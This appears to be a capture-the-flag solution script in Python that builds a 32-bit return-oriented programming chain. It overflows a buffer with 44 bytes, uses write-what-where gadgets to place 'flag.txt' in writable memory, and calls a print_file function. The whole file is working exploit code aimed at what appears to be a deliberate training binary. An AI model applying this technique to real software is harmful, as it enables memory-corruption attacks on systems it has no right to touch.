#!/usr/bin/env python
import struct

def p(x):
    return struct.pack("<I", x)

# Memory locations
writeable_mem = 0x0804a018
print_file    = p(0x080483d0)

# Gadgets: write/what/where
pop_edi_pop_ebp = p(0x080485aa)
mov_edi_ebp     = p(0x08048543)

def write_primitive(addr, bytes):
    buf = pop_edi_pop_ebp
    buf += p(addr)
    buf += bytes
    buf += mov_edi_ebp
    return buf

# Overflow
buf = 'a'*44

# Write "flag.txt" to writeable memory
buf += write_primitive(writeable_mem, "flag")
buf += write_primitive(writeable_mem+4, ".txt")

# call print file
buf += print_file
buf += "JUNK"
buf += p(writeable_mem)

print(buf)
